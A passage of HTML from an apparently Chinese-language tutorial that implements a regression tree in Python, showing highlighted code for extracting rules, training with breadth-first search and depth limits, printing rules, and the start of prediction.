class=\"crayon-sy\">.</span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dbc329687509-8\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">literals</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">list</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">_expr2literal</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">exprs</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dbc329687509-9\"><span class=\"crayon-h\">            </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rules</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">literals</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">score</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dbc329687509-10\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dbc329687509-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">left</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dbc329687509-12\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">rule_left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">copy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">exprs</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dbc329687509-13\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">rule_left</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">split</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dbc329687509-14\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">que</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rule_left</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dbc329687509-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dbc329687509-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">right</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dbc329687509-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">rule_right</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">copy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">exprs</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dbc329687509-18\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">rule_right</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">split</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dbc329687509-19\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">que</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rule_right</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0156 seconds] -->\r\n<p></p>\n<h2>2.8 训练模型</h2>\n<p>仍然使用队列+广度优先搜索，训练模型的过程中需要注意：</p>\n<ol>\n<li>控制树的最大深度max_depth；</li>\n<li>控制分裂时最少的样本量min_samples_split；</li>\n<li>叶子结点至少有两个不重复的y值；</li>\n<li>至少有一个特征是没有重复值的。</li>\n</ol>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710c2dc0418228585\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef fit(self, X, y, max_depth=5, min_samples_split=2):\r\n    self.root = Node()\r\n    que = [[0, self.root, list(range(len(y)))]]\r\n\r\n    while que:\r\n        depth, nd, idx = que.pop(0)\r\n\r\n        if depth == max_depth:\r\n            break\r\n\r\n        if len(idx) &lt; min_samples_split or \\\r\n                set(map(lambda i: y[i], idx)) == 1:\r\n            continue\r\n\r\n        feature_rets = self._choose_feature(X, y, idx)\r\n        if feature_rets is None:\r\n            continue\r\n\r\n        nd.feature, nd.split, split_avg, idx_split = feature_rets\r\n        nd.left = Node(split_avg[0])\r\n        nd.right = Node(split_avg[1])\r\n        que.append([depth+1, nd.left, idx_split[0]])\r\n        que.append([depth+1, nd.right, idx_split[1]])\r\n\r\n    self.height = depth\r\n    self._get_rules()</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc0418228585-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc0418228585-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc0418228585-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc0418228585-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc0418228585-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc0418228585-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc0418228585-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc0418228585-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc0418228585-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc0418228585-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc0418228585-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc0418228585-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc0418228585-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc0418228585-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc0418228585-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc0418228585-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc0418228585-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc0418228585-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc0418228585-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc0418228585-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc0418228585-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc0418228585-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc0418228585-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc0418228585-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc0418228585-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc0418228585-26\">26</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc0418228585-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">fit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">max_depth</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_samples_split</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc0418228585-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Node</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc0418228585-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">que</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">list</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc0418228585-4\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc0418228585-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">que</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc0418228585-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">depth</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">que</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">pop</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc0418228585-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc0418228585-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">depth</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">max_depth</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc0418228585-9\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">break</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc0418228585-10\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc0418228585-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">min_samples_split </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc0418228585-12\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">lambda</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc0418228585-13\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">continue</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc0418228585-14\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc0418228585-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">feature_rets</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">_choose_feature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc0418228585-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">feature_rets </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">None</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc0418228585-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">continue</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc0418228585-18\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc0418228585-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">split</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split_avg</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx_split</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">feature_rets</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc0418228585-20\"><span class=\"crayon-e\">        </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Node</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">split_avg</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc0418228585-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">right</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Node</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">split_avg</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc0418228585-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">que</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">depth</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx_split</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc0418228585-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">que</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">depth</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx_split</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc0418228585-24\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc0418228585-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">height</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">depth</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc0418228585-26\"><span class=\"crayon-e\">    </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">_get_rules</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0054 seconds] -->\r\n<p></p>\n<h2>2.9 打印规则</h2>\n<p>模型训练完毕，查看一下模型生成的规则</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710c2dc4744265052\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef print_rules(self):\r\n    for i, rule in enumerate(self.rules):\r\n        literals, score = rule\r\n        print(\"Rule %d: \" % i, ' | '.join(\r\n            literals) + ' =&gt; split_hat %.4f' % score)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc4744265052-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc4744265052-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc4744265052-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc4744265052-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc4744265052-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc4744265052-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">print_rules</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc4744265052-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">rule </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">enumerate</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rules</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc4744265052-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">literals</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">score</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">rule</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc4744265052-4\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"Rule %d: \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">' | '</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">join</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc4744265052-5\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">literals</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">' =&gt; split_hat %.4f'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">score</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0083 seconds] -->\r\n<p></p>\n<h2>2.10 预测一个样本</h2>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710c2dc9829084430\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div 